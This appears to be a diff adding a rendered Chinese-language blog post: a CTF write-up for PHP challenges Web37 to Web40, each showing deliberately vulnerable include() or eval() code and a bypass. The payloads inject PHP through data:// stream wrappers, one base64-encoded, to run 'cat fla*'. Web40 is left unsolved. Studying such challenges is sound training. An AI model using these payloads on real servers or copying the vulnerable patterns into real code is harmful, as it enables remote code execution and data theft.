@@ -1,0 +1,82 @@
+I"�<h3 id="web37">Web37</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/i"</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+
+  <span class="p">}</span>
+    
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>与前面的相比，这次直接换掉了<code class="language-plaintext highlighter-rouge">eval()</code>函数，变成了<code class="language-plaintext highlighter-rouge">include</code></p>
+
+<p>用伪协议写入数据流，读取flag</p>
+
+<p><a href="https://segmentfault.com/a/1190000018991087">参考文章</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload:?c=data://text/plain,&lt;?php system("cat fla*")?&gt;
+</code></pre></div></div>
+
+<h3 id="web38">Web38</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag|php|file/i"</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+
+  <span class="p">}</span>
+    
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>ban掉了<code class="language-plaintext highlighter-rouge">file</code>和<code class="language-plaintext highlighter-rouge">php</code>，直接用base64绕过去就行</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload:?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhKiIpPz4=
+</code></pre></div></div>
+
+<p>这里应该使用php的<code class="language-plaintext highlighter-rouge">base64_encode($str)</code>函数加密一下字符串，否则不匹配</p>
+
+<h3 id="web39">Web39</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/i"</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$c</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">);</span>
+  <span class="p">}</span>
+    
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>增加了后缀的限制，回在最后传入的时候添加<code class="language-plaintext highlighter-rouge">.php</code>后缀，限制了传入，但是并不严谨，因为前面的语句已经执行完毕。</p>
+
+<p><code class="language-plaintext highlighter-rouge">payload:?c=data://text/plain,&lt;?php system("cat fla*")?&gt;</code></p>
+
+<h3 id="web40">Web40</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">])){</span>
+  <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'c'</span><span class="p">];</span>
+  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/[0-9]|\~|\`|\@|\#|</span><span class="se">\\</span><span class="s2">$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|</span><span class="se">\"</span><span class="s2">|\,|\&lt;|\.|\&gt;|\/|\?|</span><span class="se">\\\\</span><span class="s2">/i"</span><span class="p">,</span> <span class="nv">$c</span><span class="p">)){</span>
+    <span class="k">eval</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>
+  <span class="p">}</span>
+    
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>啊不行了，明天看师傅们的wp吧，鸽了</p>
+
+:ET
